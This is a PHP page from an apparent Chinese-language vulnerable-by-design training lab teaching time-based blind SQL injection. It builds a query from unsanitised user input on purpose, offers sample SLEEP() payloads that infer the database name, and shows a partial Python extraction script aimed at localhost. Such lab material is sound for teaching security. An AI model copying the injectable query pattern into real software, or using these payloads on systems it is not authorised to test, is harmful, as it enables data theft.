<?php
/**
 * Pikachu-Enhanced v2.0 - 基于时间的盲注 (Time-based Blind SQLi) 教学演练
 */
$PIKA_ROOT_DIR = "../../";
$ACTIVE = array_fill(0, 300, '');
$ACTIVE[35] = 'active open';
$ACTIVE[45] = 'active';
include_once $PIKA_ROOT_DIR . 'header.php';
include_once $PIKA_ROOT_DIR . "inc/config.inc.php";
include_once $PIKA_ROOT_DIR . "inc/function.php";
include_once $PIKA_ROOT_DIR . "inc/mysql.inc.php";

$link = connect();
$html = '';
$duration = 0;
$user_name = $_GET['name'] ?? '';

if (isset($_GET['submit']) && $user_name !== '') {
    $t_start = microtime(true);
    
    // 【核心漏洞点】：无论查询成功还是失败，页面均显示一模一样的静态提示，仅能通过执行时长判断条件是否成立
    $query = "select * from users where username='$user_name'";
    @mysqli_query($link, $query);
    
    $t_end = microtime(true);
    $duration = round(($t_end - $t_start), 3);
    
    $is_delayed = ($duration >= 1.5);
    $badge_class = $is_delayed ? "danger" : "info";
    $badge_text = $is_delayed ? "🔥 探测到明显时间延迟！(条件为 TRUE)" : "⚡ 正常即时响应 (条件为 FALSE)";
    
    $html = "<div class='alert alert-{$badge_class}' style='margin:0; border-radius:8px; font-weight:700;'>
        <div style='display:flex; justify-content:space-between; align-items:center;'>
            <span><i class='fa fa-clock-o'></i> 请求耗时: <span style='font-size:16px; color:#ef4444;'>{$duration} 秒</span></span>
            <span class='badge badge-{$badge_class}' style='font-size:12px; padding:4px 8px;'>{$badge_text}</span>
        </div>
        <hr style='margin:8px 0; border-color:rgba(0,0,0,0.1);' />
        <p style='margin:0; font-size:12.5px;'>页面恒定回显：不管输入什么，系统均提示「i am here~」</p>
    </div>";
}
?>

<div class="main-content">
    <div class="main-content-inner">
        <div class="breadcrumbs ace-save-state" id="breadcrumbs">
            <ul class="breadcrumb">
                <li><i class="ace-icon fa fa-home home-icon"></i><a href="sqli.php">SQL Injection</a></li>
                <li class="active">时间盲注 (Time-based Blind)</li>
            </ul>
            <a href="#" class="tips-btn" data-container="body" data-toggle="popover" data-placement="bottom" title="💡 时间盲注常用函数" data-content="使用 if(ascii(substr(database(),1,1))=112, sleep(2), 0) 当条件成立时让数据库延时执行！">
                <i class="fa fa-lightbulb-o"></i> 攻防提示
            </a>
        </div>

        <div class="page-content">
            <div class="cyber-stage-container">
                <div class="cyber-header-card">
                    <h1 class="cyber-header-title">
                        ⏱️ 9. 时间盲注漏洞攻防教学 (Time-based Blind SQLi / SLEEP)
                        <span class="cyber-badge-chip">SQLi · SLEEP() 延时 · 侧信道测量 · 200 PTS</span>
                    </h1>
                    <p class="cyber-desc-text">
                        当目标系统不仅<b>无数据回显、无报错回显</b>，甚至无论输入任何内容<b>返回的页面内容均完全一致（无布尔差异）</b>时，常规注入与布尔盲注均失效。此时攻击者使用 <code>IF(condition, SLEEP(3), 0)</code> 构造时间侧信道：若猜解条件为真则数据库主动延时 3 秒响应，以此精准推断数据库字符！
                    </p>
                </div>

                <div class="row">
                    <!-- Left: Delay Testbed -->
                    <div class="col-lg-6 col-md-12" style="margin-bottom:20px;">
                        <div class="cyber-login-card">
                            <h4 style="margin:0 0 16px 0; color:var(--text-primary); font-weight:800; font-size:16px;">
                                <i class="fa fa-hourglass-half" style="color:var(--primary);"></i> 时间延迟探测控制端
                            </h4>

                            <form method="GET" action="sqli_blind_t.php">
                                <div class="form-group" style="margin-bottom:12px;">
                                    <label style="font-weight:700; color:var(--text-primary); font-size:13px;">输入用户名或 SLEEP 载荷：</label>
                                    <div class="input-group">
                                        <input class="form-control" type="text" id="name_input" name="name" value="<?php echo htmlspecialchars($user_name); ?>" placeholder="输入测试语句..." style="font-family:monospace;" required />
                                        <span class="input-group-btn">
                                            <button class="btn btn-primary" type="submit" name="submit" value="submit" style="font-weight:700;">
                                                <i class="fa fa-play"></i> 执行延时测试
                                            </button>
                                        </span>
                                    </div>
                                </div>

                                <div style="margin-bottom:16px;">
                                    <label style="font-size:12px; font-weight:700; color:var(--text-muted); margin-bottom:6px; display:block;">
                                        ⚡ 快速测试延时 Payload：
                                    </label>
                                    <div style="display:flex; flex-direction:column; gap:6px;">
                                        <button type="button" class="btn btn-xs btn-default text-left" onclick="fillInput('vince')">
                                            <i class="fa fa-bolt" style="color:#10b981;"></i> 正常请求：<code>vince</code> (即时响应 ~0.01s)
                                        </button>
                                        <button type="button" class="btn btn-xs btn-default text-left" onclick="fillInput('vince\' and sleep(2) #')">
                                            <i class="fa fa-clock-o" style="color:#ef4444;"></i> 无条件延时 2 秒：<code>vince' and sleep(2) #</code>
                                        </button>
                                        <button type="button" class="btn btn-xs btn-default text-left" onclick="fillInput('vince\' and if(substr(database(),1,1)=\'p\',sleep(2),0) #')">
                                            <i class="fa fa-database" style="color:#f59e0b;"></i> 条件延时：库名首字母为 'p' 延时 2 秒
                                        </button>
                                        <button type="button" class="btn btn-xs btn-default text-left" onclick="fillInput('vince\' and if(substr(database(),1,1)=\'z\',sleep(2),0) #')">
                                            <i class="fa fa-times" style="color:#8b5cf6;"></i> 假条件：库名首字母为 'z' (不延时)
                                        </button>
                                    </div>
                                </div>
                            </form>

                            <hr style="border-color:var(--border-color); margin:16px 0;" />
                            <h4 style="margin:0 0 10px 0; color:var(--text-primary); font-weight:800; font-size:14px;">
                                <i class="fa fa-desktop" style="color:#06b6d4;"></i> 响应耗时秒表
                            </h4>
                            <?php if (!empty($html)): echo $html; else: ?>
                                <div style="background:var(--bg-secondary); border:1px dashed var(--border-color); border-radius:8px; padding:18px; text-align:center; color:var(--text-muted); font-size:13px;">
                                    <i class="fa fa-info-circle"></i> 点击上方 SLEEP 载荷观察请求耗时差异
                                </div>
                            <?php endif; ?>
                        </div>
                    </div>

                    <!-- Right Column: Python Multi-threading Exploitation -->
                    <div class="col-lg-6 col-md-12" style="margin-bottom:20px;">
                        <div class="cyber-login-card">
                            <h4 style="margin:0 0 14px 0; color:var(--text-primary); font-weight:800; font-size:16px;">
                                <i class="fa fa-code" style="color:#10b981;"></i> Python 时间盲注并发优化思路
                            </h4>

                            <pre style="background:#090d16; color:#38bdf8; border:1px solid #1e293b; border-radius:8px; padding:14px; font-family:'Fira Code', monospace; font-size:11.5px; line-height:1.6; max-height:260px; overflow-y:auto;">import time, requests

url = "http://127.0.0.1:8765/vul/sqli/sqli_blind_t.php"

def test_char(pos, char_code):
    payload = f"vince' and if(ascii(substr(database(),{pos},1))={char_code},sleep(1.5),0) #"
    t1 = time.time()
    requests.get(url, params={"name": payload, "submit": "submit"})
    duration = time.time() - t1
    return duration >= 1.4

# 采用多线程或异步协程加速时间盲注提取
print("[+] Benchmarking target timeout response...")</pre>
                        </div>
                    </div>
                </div>

                <!-- Navigation -->
                <div style="display:flex; justify-content:space-between; align-items:center; border-top:1px solid var(--border-color); padding-top:18px;">
                    <a href="sqli_blind_b.php" class="btn btn-default" style="border-radius:8px;"><i class="fa fa-arrow-left"></i> 上一关：布尔盲注</a>
                    <a href="sqli_widebyte.php" class="btn btn-primary" style="border-radius:8px; font-weight:700;">下一关：宽字节注入 <i class="fa fa-arrow-right"></i></a>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
function fillInput(val) {
    document.getElementById('name_input').value = val;
    document.forms[0].submit();
}
</script>

<?php include_once $PIKA_ROOT_DIR . 'footer.php'; ?>
